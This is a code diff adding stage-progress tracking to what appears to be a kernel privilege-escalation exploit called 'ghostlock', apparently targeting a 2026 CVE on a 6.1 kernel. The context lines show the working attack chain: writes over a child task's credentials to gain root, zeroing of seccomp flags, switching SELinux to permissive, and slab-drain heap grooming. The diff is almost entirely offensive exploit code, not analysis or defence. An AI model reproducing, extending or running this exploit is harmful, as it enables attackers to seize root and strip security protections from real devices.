@@ -24,6 +24,7 @@
 #include "session/victim_process.hpp"
 #include "support/decls.hpp"
 #include "support/fatal_error.hpp"
+#include "support/run_state.hpp"
 
 #include <unistd.h>
 
@@ -161,6 +162,7 @@ namespace ghostlock::session::backend {
          *     whole word. VERIFY ON-DEVICE that zeroing bytes 0x28-0x2f is
          *     safe on your 6.1.145 kernel; if not, comment out the tagB write.
          * ------------------------------------------------------------------ */
+            support::run_state::enter("w2b");
             {
                 static int32_t vr_needed = -1;
                 if (vr_needed < 0) {
@@ -212,7 +214,9 @@ namespace ghostlock::session::backend {
                     }
                 }
             }
+            support::run_state::complete("w2b");
 
+            support::run_state::enter("w2a");
             Status got_root = retry_write_stage<M>(
                 session, "W2: cred", child_task + ghostlock::profile::task_cred_off(), 2,
                 g_exploit_session.profile.w2_attempts(),
@@ -227,6 +231,7 @@ namespace ghostlock::session::backend {
                 waitpid(pipes.child(), nullptr, WNOHANG);
                 return VictimRound::Failed;
             }
+            support::run_state::complete("w2a");
             chain.ever_rooted = 1;
             /* rooted children never exit; chain failures park (P) */
             return VictimRound::Rooted;
@@ -261,6 +266,7 @@ namespace ghostlock::session::backend {
                 .leaf_to_target8 = !exact_target,
             };
             if (!exact_target) {
+                support::run_state::enter("w3a");
                 Status dir_ok = retry_write_stage<M>(
                     session, "W3-0: leaf dir", child_task + ghostlock::profile::task_comm_off(), 1, 4, 50000,
                     victim::verify_leaf_dir_stage, &w3_context, 1);
@@ -272,6 +278,9 @@ namespace ghostlock::session::backend {
                     pr_warning("W3 leaf direction probe failed; retiring child\n");
                     return false;
                 }
+                support::run_state::complete("w3a");
+            } else {
+                support::run_state::complete("w3a");
             }
 
             uintptr_t flags_target = w3_context.leaf_to_target8
@@ -285,6 +294,7 @@ namespace ghostlock::session::backend {
             for (uint32_t attempt = 1; attempt <= w3_attempts; attempt++) {
                 pr_info("W3: TIF_SECCOMP+mode attempt %u/%u\n", attempt, w3_attempts);
                 if (attempt == 1) attack::slab_drain();
+                support::run_state::enter("w3b");
                 const memory::WriteRequest flags_request =
                         memory::WriteRequest::make(flags_target, memory::WriteMode::Zero, 1);
                 Status routed = Cve2026_43499Policy::template attack_write<M>(session, flags_request, "W3: TIF_SECCOMP");
@@ -293,7 +303,9 @@ namespace ghostlock::session::backend {
                     usleep(100000);
                     continue;
                 }
+                support::run_state::complete("w3b");
                 usleep(g_exploit_session.profile.w3_settle_us());
+                support::run_state::enter("w3c");
                 const memory::WriteRequest mode_request =
                         memory::WriteRequest::make(mode_target, memory::WriteMode::Zero, 1);
                 routed = Cve2026_43499Policy::template attack_write<M>(session, mode_request, "W3: seccomp mode");
@@ -302,6 +314,7 @@ namespace ghostlock::session::backend {
                     usleep(100000);
                     continue;
                 }
+                support::run_state::complete("w3c");
                 usleep(g_exploit_session.profile.w3_settle_us());
                 int32_t st = 0;
                 if (waitpid(pipes.child(), &st, WNOHANG) == pipes.child()) {
@@ -382,6 +395,7 @@ namespace ghostlock::session::backend {
                     /* a non-resident multicast write cannot safely retry a missed W1 */
                     if (!session.profile.multicast_resident()) w1_attempts = 1;
                 }
+                support::run_state::enter("w1a");
                 selinux_ok = retry_write_stage<M>(
                     session,
                     "W1: SELinux",
@@ -395,11 +409,19 @@ namespace ghostlock::session::backend {
                     route::kernel5_resident_stop();
                     return StageResult::Failed;
                 }
+                support::run_state::complete("w1a");
+                support::run_state::enter("w1b");
                 if (!w1_scratch_repair<M>(session)) return StageResult::Failed;
+                support::run_state::complete("w1b");
+                support::run_state::enter("w1c");
                 if (!M::w1_resident_repair(session)) return StageResult::Failed;
+                support::run_state::complete("w1c");
                 attack::timer_mark("Write 1 complete");
             } else {
                 pr_success("SELinux already permissive\n");
+                support::run_state::complete("w1a");
+                support::run_state::complete("w1b");
+                support::run_state::complete("w1c");
             }
             return StageResult::Continue;
         }
